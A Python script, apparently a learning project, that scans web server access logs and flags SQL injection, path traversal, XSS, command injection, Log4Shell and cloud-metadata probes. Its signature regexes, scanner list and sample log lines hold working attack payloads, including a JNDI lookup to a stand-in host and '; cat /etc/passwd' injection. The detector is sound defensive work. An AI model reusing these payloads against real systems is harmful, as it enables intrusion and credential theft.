# Web Access Log Attack Detector — Day 19 (improved)
# ---------------------------------------------------------------
# A SOC (Security Operations Center) mini-tool: read web server
# access log lines (Apache/Nginx combined format) and flag
# suspicious requests the way a real analyst's first-pass triage
# would: SQL injection probes, path traversal, XSS attempts,
# directory scanning, Log4Shell probes, cloud-metadata (SSRF)
# probes, and known scanner user-agents.
#
# ANALOGY: think of a web server as a shop and each log line as an
# entry in the security camera log. This script is the night-shift
# guard who rewinds the footage and circles every frame where
# someone tested the door handles, checked the windows, or wrote
# graffiti — then hands you a tidy incident summary.
#
# WHAT'S NEW IN THIS VERSION (2026-11-12):
#   * Full argparse CLI: --file, --demo, --json, --min-severity,
#     --ip (focus on one address), --spray-threshold, --save and
#     --compare baseline files.
#   * Two new signatures: Log4Shell (${jndi:) and SSRF / cloud
#     metadata probes (169.254.169.254, metadata.google.internal).
#   * Per-IP summary table: alerts, worst severity, top signature,
#     error count and spray flag for every suspicious address.
#   * Baseline mode: --save stores per-IP alert counts, --compare
#     flags NEW / GONE / CHANGED attackers between two runs.
#   * Exit codes: 0 = clean log, 1 = alerts found, 2 = usage/file
#     error — so the tool plugs into scripts and cron jobs.
#   * Malformed lines are now counted and reported instead of
#     silently skipped, and missing files give a friendly error.
#
# SAFE BY DESIGN:
#   * Reads log LINES as text — never touches the network.
#   * Ships with built-in sample data and sample log files.
#   * Detects patterns only; it never blocks, attacks, or changes
#     anything. A detector is not a weapon.
#
# RUN:
#   python3 attack_detector.py                # built-in sample data
#   python3 attack_detector.py sample_access.log
#   python3 attack_detector.py --demo         # sample + new attacks
#   python3 attack_detector.py --json access.log
#   python3 attack_detector.py --ip 203.0.113.90 access.log
#   python3 attack_detector.py --save baseline.json access.log
#   python3 attack_detector.py --compare baseline.json access.log
# ---------------------------------------------------------------

import argparse
import json
import re
import sys
from collections import Counter, defaultdict

# --- What we look for: attack "fingerprints" -------------------
# Each entry: (name, severity, regex pattern). These are classic,
# well-documented malicious request patterns from web-app attack
# cheat sheets (OWASP). They are SIGNATURES for detection, which
# is exactly how real IDS/WAF rules work: match a known pattern,
# raise an alert, let a human confirm.
SIGNATURES = [
    ("SQL injection probe", "HIGH",
     r"(?i)(union\s+select|select\s+.*\s+from|drop\s+table|insert\s+into|"
     r"'\s*(or|and)\s+'?\d+'?\s*=\s*'?\d+|sleep\s*\(\s*\d+\s*\)|"
     r"benchmark\s*\(|@@version|information_schema)"),
    ("Path traversal attempt", "HIGH",
     r"(\.\./|\.\.\\|%2e%2e|%252e|/etc/passwd|/etc/shadow|boot\.ini)"),
    ("XSS / script injection attempt", "MEDIUM",
     r"(?i)(<script|javascript:|onerror\s*=|onload\s*=|alert\s*\(|"
     r"%3cscript|document\.cookie)"),
    ("Remote file include / code execution probe", "HIGH",
     r"(?i)(=\s*https?://|=\s*https?%3a%2f%2f|wget\s|curl\s|"
     r";\s*cat\s|\|\s*id|`id`|/bin/sh|cmd\.exe)"),
    ("Sensitive file / directory probing", "MEDIUM",
     r"(?i)(/\.git|/\.env|wp-login|phpmyadmin|/admin|"
     r"\.bak$|\.sql$|\.zip$|\.old$|server-status|/manager/html)"),
    # NEW: Log4Shell — a request carrying ${jndi:ldap://...} tries to
    # make a Java app fetch attacker-controlled code. One of the
    # most-scanned patterns of recent years; the guide's "learn next"
    # suggestion is now a built-in signature.
    ("Log4Shell probe", "HIGH",
     r"(?i)(\$\{jndi:|\$\{[^}]*jndi|%24%7bjndi)"),
    # NEW: SSRF / cloud-metadata probe — asking the server to fetch
    # the cloud metadata address (169.254.169.254) or the internal
    # metadata hostname. If the server obeys, the attacker steals
    # the cloud credentials that live there.
    ("SSRF / cloud metadata probe", "HIGH",
     r"(?i)(169\.254\.169\.254|metadata\.google\.internal|"
     r"metadata\.google|/latest/meta-data)"),
]

# Scanners announce themselves. Real attackers sometimes don't, but
# vulnerability scanners, bots, and pentest tools almost always do.
# Matching these is like recognizing a burglar's van by its logo.
SCANNER_AGENTS = [
    "nikto", "sqlmap", "nmap", "acunetix", "nessus", "wpscan",
    "dirbuster", "gobuster", "masscan", "zgrab", "openvas",
    "metasploit", "hydra", "burp",
]

# Combined log format:
# 203.0.113.10 - frank [10/Oct/2026:13:55:36 -0400] "GET /index.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"
LOG_LINE = re.compile(
    r'(?P<ip>\S+) \S+ \S+ \[(?P<time>[^\]]+)\] '
    # path uses .+? (not \S+) on purpose: real attack requests often
    # contain literal spaces, e.g.  GET /x.php?id=1 UNION SELECT 1--
    r'"(?P<method>\S+)\s+(?P<path>.+?)\s+(?P<proto>\S+)" '
    r'(?P<status>\d{3}) (?P<size>\S+) "[^"]*" "(?P<agent>[^"]*)"'
)

# Everything under TEST-NET ranges (RFC 5737) so the sample data can
# never point at a real host.
SAMPLE_LOG = """\
203.0.113.10 - - [17/Oct/2026:09:12:01 -0400] "GET /index.html HTTP/1.1" 200 512 "-" "Mozilla/5.0"
203.0.113.11 - - [17/Oct/2026:09:12:04 -0400] "GET /about.html HTTP/1.1" 200 1024 "-" "Mozilla/5.0"
198.51.100.23 - - [17/Oct/2026:09:13:10 -0400] "GET /index.php?id=1' OR '1'='1 HTTP/1.1" 500 230 "-" "Mozilla/5.0"
198.51.100.23 - - [17/Oct/2026:09:13:12 -0400] "GET /index.php?id=1 UNION SELECT 1,2,3-- HTTP/1.1" 500 230 "-" "Mozilla/5.0"
198.51.100.23 - - [17/Oct/2026:09:13:15 -0400] "GET /index.php?id=1 AND SLEEP(5)-- HTTP/1.1" 200 230 "-" "Mozilla/5.0"
203.0.113.44 - - [17/Oct/2026:09:14:02 -0400] "GET /../../etc/passwd HTTP/1.1" 400 120 "-" "Mozilla/5.0"
203.0.113.44 - - [17/Oct/2026:09:14:05 -0400] "GET /..%2f..%2fetc%2fshadow HTTP/1.1" 400 120 "-" "Mozilla/5.0"
192.0.2.77 - - [17/Oct/2026:09:15:44 -0400] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 900 "-" "Mozilla/5.0"
192.0.2.77 - - [17/Oct/2026:09:15:52 -0400] "GET /page?x=%3cscript%3e HTTP/1.1" 200 910 "-" "Mozilla/5.0"
203.0.113.90 - - [17/Oct/2026:09:16:20 -0400] "GET /.git/config HTTP/1.1" 404 150 "-" "nikto/2.1.6"
203.0.113.90 - - [17/Oct/2026:09:16:21 -0400] "GET /.env HTTP/1.1" 404 150 "-" "nikto/2.1.6"
203.0.113.90 - - [17/Oct/2026:09:16:22 -0400] "GET /wp-login.php HTTP/1.1" 404 150 "-" "nikto/2.1.6"
203.0.113.90 - - [17/Oct/2026:09:16:23 -0400] "GET /phpmyadmin/ HTTP/1.1" 404 150 "-" "nikto/2.1.6"
203.0.113.90 - - [17/Oct/2026:09:16:24 -0400] "GET /server-status HTTP/1.1" 403 150 "-" "nikto/2.1.6"
203.0.113.10 - - [17/Oct/2026:09:17:01 -0400] "GET /contact.html HTTP/1.1" 200 800 "-" "Mozilla/5.0"
198.51.100.99 - - [17/Oct/2026:09:18:11 -0400] "GET /download?file=x; cat /etc/passwd HTTP/1.1" 400 100 "-" "sqlmap/1.7.2"
203.0.113.10 - - [17/Oct/2026:09:19:30 -0400] "GET /products.html HTTP/1.1" 200 1400 "-" "Mozilla/5.0"
"""

# Demo add-on: the two NEW signatures in action, plus one clean
# request for contrast. Shown by --demo (built-in sample + these).
NEW_ATTACKS_LOG = """\
198.51.100.55 - - [12/Nov/2026:08:00:01 -0500] "GET /search?q=${jndi:ldap://evil.example/x} HTTP/1.1" 200 410 "-" "Mozilla/5.0"
198.51.100.55 - - [12/Nov/2026:08:00:04 -0500] "GET /x?u=http://169.254.169.254/latest/meta-data/ HTTP/1.1" 403 120 "-" "curl/8.0"
192.0.2.200 - - [12/Nov/2026:08:01:10 -0500] "GET /help.html HTTP/1.1" 200 640 "-" "Mozilla/5.0"
"""

# Exit codes — so the tool plugs into scripts and cron jobs:
#   0 = log scanned, no alerts      1 = alerts found
#   2 = usage or file error (missing file, bad flag, bad baseline)
EXIT_CLEAN, EXIT_ALERTS, EXIT_ERROR = 0, 1, 2
SEVERITY_RANK = {"HIGH": 0, "MEDIUM": 1}


def parse_lines(text):
    """Turn raw log text into a list of dicts.

    Returns (entries, skipped): skipped counts lines that are not
    empty but don't match the combined log format, so a mangled
    log is reported instead of silently under-counted.
    """
    entries, skipped = [], 0
    for line in text.splitlines():
        line = line.strip()
        if not line:
            continue
        m = LOG_LINE.match(line)
        if m:
            entries.append(m.groupdict())
        else:
            skipped += 1
    return entries, skipped


def analyze(entries, spray_threshold=5):
    """Match every entry against signatures + scanner agents.

    Returns (alerts, stats):
      alerts: list of dicts with ip, signature, severity, path, agent
      stats:  dict with counts a SOC analyst would care about.
    """
    alerts = []
    status_by_ip = defaultdict(Counter)
    errors_by_ip = Counter()   # 4xx/5xx per IP: scanners spray 404s
    total_by_ip = Counter()

    compiled = [(name, sev, re.compile(pat)) for name, sev, pat in SIGNATURES]

    for e in entries:
        ip, path, agent = e["ip"], e["path"], e["agent"]
        total_by_ip[ip] += 1
        status_by_ip[ip][e["status"]] += 1
        if e["status"].startswith(("4", "5")):
            errors_by_ip[ip] += 1

        for name, sev, pat in compiled:
            if pat.search(path):
                alerts.append({"ip": ip, "signature": name, "severity": sev,
                               "path": path, "agent": agent})
        agent_l = agent.lower()
        for scanner in SCANNER_AGENTS:
            if scanner in agent_l:
                alerts.append({"ip": ip,
                               "signature": f"Known scanner user-agent ({scanner})",
                               "severity": "MEDIUM", "path": path,
                               "agent": agent})
                break  # one alert per request is enough for the agent

    # Behavioral rule: >= spray_threshold error responses from one
    # IP = spray behavior. Signature matching catches KNOWN attacks;
    # behavior rules catch unknown ones doing noisy things. Real
    # SIEMs combine both.
    sprayers = {ip: n for ip, n in errors_by_ip.items()
                if n >= spray_threshold}

    # Per-IP summary: one line per suspicious address — alerts,
    # worst severity, most common signature, requests, errors.
    per_ip = {}
    for ip in {a["ip"] for a in alerts} | set(sprayers):
        ip_alerts = [a for a in alerts if a["ip"] == ip]
        worst = min((a["severity"] for a in ip_alerts),
                    key=lambda s: SEVERITY_RANK.get(s, 9), default="-")
        top_sig = Counter(a["signature"] for a in ip_alerts).most_common(1)
        per_ip[ip] = {
            "alerts": len(ip_alerts),
            "worst_severity": worst,
            "top_signature": top_sig[0][0] if top_sig else "-",
            "requests": total_by_ip[ip],
            "errors": errors_by_ip[ip],
            "spray": ip in sprayers,
        }

    stats = {
        "total_requests": len(entries),
        "unique_ips": len(total_by_ip),
        "alerts": len(alerts),
        "spray_threshold": spray_threshold,
        "sprayers": sprayers,
        "by_severity": Counter(a["severity"] for a in alerts),
        "by_signature": Counter(a["signature"] for a in alerts),
        "top_ips": total_by_ip.most_common(5),
        "per_ip": per_ip,
    }
    return alerts, stats


def build_baseline(stats):
    """Shrink stats to what --save/--compare need: alerts per IP."""
    return {ip: info["alerts"] for ip, info in stats["per_ip"].items()}


def compare_baseline(baseline, stats):
    """Compare a saved baseline against the current run.

    Returns a list of (change, ip, old, new) rows:
      NEW     — alerting now, wasn't in the baseline
      GONE    — was alerting, no alerts this run
      CHANGED — alert count moved up or down
    """
    current = build_baseline(stats)
    rows = []
    for ip, new in sorted(current.items()):
        if ip not in baseline:
            rows.append(("NEW", ip, 0, new))
        elif baseline[ip] != new:
            rows.append(("CHANGED", ip, baseline[ip], new))
    for ip, old in sorted(baseline.items()):
        if ip not in current:
            rows.append(("GONE", ip, old, 0))
    return rows


def filter_stats(stats, shown):
    """Rebuild the alert-dependent parts of stats from a filtered
    alert list, so --min-severity / --ip reports stay consistent:
    totals (requests, unique IPs) still describe the whole log,
    but alerts, severity/signature counts and the per-IP table
    describe only what is shown. Sprayers stay, because spray
    detection depends on error counts, not on shown alerts.
    """
    shown_ips = {a["ip"] for a in shown}
    per_ip = {}
    for ip, info in stats["per_ip"].items():
        if ip in shown_ips or ip in stats["sprayers"]:
            ip_alerts = [a for a in shown if a["ip"] == ip]
            worst = min((a["severity"] for a in ip_alerts),
                        key=lambda s: SEVERITY_RANK.get(s, 9), default="-")
            top_sig = Counter(a["signature"]
                              for a in ip_alerts).most_common(1)
            per_ip[ip] = dict(info)
            per_ip[ip]["alerts"] = len(ip_alerts)
            per_ip[ip]["worst_severity"] = worst
            per_ip[ip]["top_signature"] = (top_sig[0][0]
                                           if top_sig else "-")
    out = dict(stats)
    out["alerts"] = len(shown)
    out["by_severity"] = Counter(a["severity"] for a in shown)
    out["by_signature"] = Counter(a["signature"] for a in shown)
    out["per_ip"] = per_ip
    return out


def report(alerts, stats, skipped=0, baseline_rows=None):
    """Print a SOC-style incident summary."""
    print("=" * 62)
    print("WEB ACCESS LOG ATTACK DETECTOR — triage summary")
    print("=" * 62)
    print(f"Requests scanned : {stats['total_requests']}")
    print(f"Unique IPs       : {stats['unique_ips']}")
    print(f"Alerts raised    : {stats['alerts']}")
    sev = stats["by_severity"]
    print(f"  HIGH alerts    : {sev.get('HIGH', 0)}")
    print(f"  MEDIUM alerts  : {sev.get('MEDIUM', 0)}")
    if skipped:
        print(f"Unparseable lines : {skipped} (not combined log format)")
    print()

    if not alerts:
        print("No suspicious patterns found. (A clean log is a result too.)")
        return

    print("--- Attack signatures seen ---")
    for name, count in stats["by_signature"].most_common():
        print(f"  {count:>3}x  {name}")
    print()

    print("--- Alerts (highest severity first) ---")
    for a in sorted(alerts, key=lambda x: (SEVERITY_RANK.get(x["severity"], 9),
                                           x["ip"])):
        print(f"[{a['severity']:>6}] {a['ip']:>15}  {a['signature']}")
        print(f"           path : {a['path'][:90]}")
        if a["severity"] == "MEDIUM" and "scanner" in a["signature"]:
            print(f"           agent: {a['agent'][:60]}")
    print()

    if stats["sprayers"]:
        print("--- Behavioral flag: 404/5xx spray "
              f"(>={stats['spray_threshold']} errors from one IP) ---")
        for ip, n in stats["sprayers"].items():
            print(f"  {ip}: {n} error responses — likely directory scanning")
        print()

    print("--- Per-IP summary (suspicious addresses only) ---")
    print(f"  {'IP':>15}  {'alerts':>6}  {'worst':>6}  "
          f"{'errors':>6}  top signature")
    for ip, info in sorted(stats["per_ip"].items(),
                           key=lambda kv: (-kv[1]["alerts"], kv[0])):
        spray = " SPRAY" if info["spray"] else ""
        print(f"  {ip:>15}  {info['alerts']:>6}  "
              f"{info['worst_severity']:>6}  {info['errors']:>6}  "
              f"{info['top_signature']}{spray}")
    print()

    if baseline_rows is not None:
        print("--- Baseline comparison ---")
        if not baseline_rows:
            print("  No changes since the baseline — same attackers, "
                  "same counts.")
        for change, ip, old, new in baseline_rows:
            print(f"  {change:<8} {ip:>15}  {old} -> {new} alerts")
        print()

    print("--- Top talkers ---")
    for ip, n in stats["top_ips"]:
        print(f"  {ip}: {n} requests")
    print()
    print("SOC next steps: 1) confirm alerts are malicious (not your own")
    print("pentest), 2) check what those IPs touched after the probe,")
    print("3) block repeat offenders at the firewall, 4) patch the")
    print("vulnerability class, not just the one URL.")


def to_json(alerts, stats, skipped=0, baseline_rows=None):
    """The same report as machine-readable JSON for SIEM piping."""
    out = {
        "total_requests": stats["total_requests"],
        "unique_ips": stats["unique_ips"],
        "alerts": stats["alerts"],
        "by_severity": dict(stats["by_severity"]),
        "by_signature": dict(stats["by_signature"]),
        "unparseable_lines": skipped,
        "sprayers": stats["sprayers"],
        "per_ip": stats["per_ip"],
        "top_ips": stats["top_ips"],
        "alert_list": alerts,
    }
    if baseline_rows is not None:
        out["baseline_changes"] = [
            {"change": c, "ip": ip, "before": old, "after": new}
            for c, ip, old, new in baseline_rows
        ]
    return json.dumps(out, indent=2)


def note(msg, json_mode):
    """Status line: stderr in --json mode so stdout stays pure JSON."""
    print(msg, file=sys.stderr if json_mode else sys.stdout)


def load_text(path):
    """Read a log file, with a plain-English error if it fails."""
    try:
        with open(path, encoding="utf-8", errors="replace") as f:
            return f.read()
    except FileNotFoundError:
        print(f"Error: no such file: {path}", file=sys.stderr)
        print("Check the path and try again — or run with no file to "
              "analyze the built-in sample log.", file=sys.stderr)
        sys.exit(EXIT_ERROR)
    except IsADirectoryError:
        print(f"Error: {path} is a directory, not a log file.",
              file=sys.stderr)
        sys.exit(EXIT_ERROR)
    except OSError as exc:
        print(f"Error: could not read {path}: {exc}", file=sys.stderr)
        sys.exit(EXIT_ERROR)


def parse_args(argv=None):
    p = argparse.ArgumentParser(
        description="Flag attack probes in web access logs "
                    "(Apache/Nginx combined format) — SOC first-pass triage.")
    p.add_argument("file", nargs="?", default=None,
                   help="log file to scan (default: built-in sample log)")
    p.add_argument("--demo", action="store_true",
                   help="analyze the built-in sample plus the new-attack "
                        "demo lines (Log4Shell + SSRF probes)")
    p.add_argument("--json", action="store_true",
                   help="print the report as JSON instead of text")
    p.add_argument("--min-severity", choices=["HIGH", "MEDIUM"],
                   default="MEDIUM",
                   help="only show alerts at this severity or above "
                        "(default: MEDIUM, i.e. all)")
    p.add_argument("--ip", default=None,
                   help="only report alerts from this one IP address")
    p.add_argument("--spray-threshold", type=int, default=5,
                   help="error responses from one IP that count as a "
                        "404/5xx spray (default: 5)")
    p.add_argument("--save", metavar="BASELINE.json", default=None,
                   help="save per-IP alert counts to a baseline file")
    p.add_argument("--compare", metavar="BASELINE.json", default=None,
                   help="compare against a baseline file saved with --save")
    args = p.parse_args(argv)
    if args.spray_threshold < 1:
        p.error("--spray-threshold must be 1 or more")
    if args.save and args.compare:
        p.error("use --save or --compare, not both in one run")
    return args


def main(argv=None):
    args = parse_args(argv)

    if args.demo:
        text = SAMPLE_LOG + NEW_ATTACKS_LOG
        note("(Demo mode — built-in sample log plus new-attack lines.)",
             args.json)
    elif args.file:
        text = load_text(args.file)
        note(f"Reading log file: {args.file}", args.json)
    else:
        text = SAMPLE_LOG
        note("(No file given — analyzing built-in sample log.)", args.json)

    entries, skipped = parse_lines(text)
    if not entries:
        print("No parseable log lines found. Expected Apache/Nginx "
              "combined log format.", file=sys.stderr)
        sys.exit(EXIT_ERROR)

    alerts, stats = analyze(entries, args.spray_threshold)

    # --min-severity / --ip narrow the ALERTS shown, not the totals,
    # so the summary still tells the truth about the whole log.
    shown = [a for a in alerts
             if SEVERITY_RANK[a["severity"]] <= SEVERITY_RANK[args.min_severity]
             and (args.ip is None or a["ip"] == args.ip)]

    baseline_rows = None
    if args.compare:
        try:
            with open(args.compare, encoding="utf-8") as f:
                baseline = json.load(f)
        except FileNotFoundError:
            print(f"Error: no such baseline file: {args.compare}",
                  file=sys.stderr)
            print("Save one first with --save.", file=sys.stderr)
            sys.exit(EXIT_ERROR)
        except (OSError, ValueError) as exc:
            print(f"Error: could not read baseline {args.compare}: {exc}",
                  file=sys.stderr)
            sys.exit(EXIT_ERROR)
        if not isinstance(baseline, dict):
            print(f"Error: baseline {args.compare} is not a JSON object "
                  "of {ip: alert count}.", file=sys.stderr)
            sys.exit(EXIT_ERROR)
        baseline_rows = compare_baseline(baseline, stats)

    if args.save:
        try:
            with open(args.save, "w", encoding="utf-8") as f:
                json.dump(build_baseline(stats), f, indent=2, sort_keys=True)
            note(f"Baseline saved: {args.save}", args.json)
        except OSError as exc:
            print(f"Error: could not write baseline {args.save}: {exc}",
                  file=sys.stderr)
            sys.exit(EXIT_ERROR)

    shown_stats = filter_stats(stats, shown)
    if args.json:
        print(to_json(shown, shown_stats, skipped, baseline_rows))
    else:
        report(shown, shown_stats, skipped, baseline_rows)

    sys.exit(EXIT_ALERTS if alerts else EXIT_CLEAN)


if __name__ == "__main__":
    main()
